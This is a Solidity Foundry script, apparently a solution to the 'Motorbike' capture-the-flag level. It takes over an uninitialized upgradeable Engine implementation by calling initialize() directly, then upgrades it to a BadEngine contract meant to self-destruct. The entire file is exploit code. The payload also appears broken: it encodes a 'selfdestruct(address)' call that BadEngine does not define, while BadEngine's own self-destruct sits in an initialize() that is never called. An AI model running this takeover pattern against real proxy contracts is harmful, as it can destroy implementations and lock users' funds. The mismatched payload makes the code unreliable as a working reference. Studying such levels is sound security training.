// SPDX-License-Identifier: MIT
pragma solidity >=0.8.10;

import "forge-std/Script.sol";
import "../src/Motorbike.sol";

contract MotorbikeHack is Script {
    Motorbike public motorbike;
    Engine public engine;
    address public eoa = address(1024);

    function setUp() public {
        engine = new Engine();
        motorbike = new Motorbike(address(engine));
        vm.deal(address(engine), 10 ether);
    }

    function run() public {
        engine.initialize();

        BadEngine badEngine = new BadEngine();
        bytes memory payload = abi.encodeWithSignature(
            "selfdestruct(address)",
            eoa
        );
        engine.upgradeToAndCall(address(badEngine), payload);
    }
}

contract BadEngine {
    function initialize() external {
        selfdestruct(payable(msg.sender));
    }
}
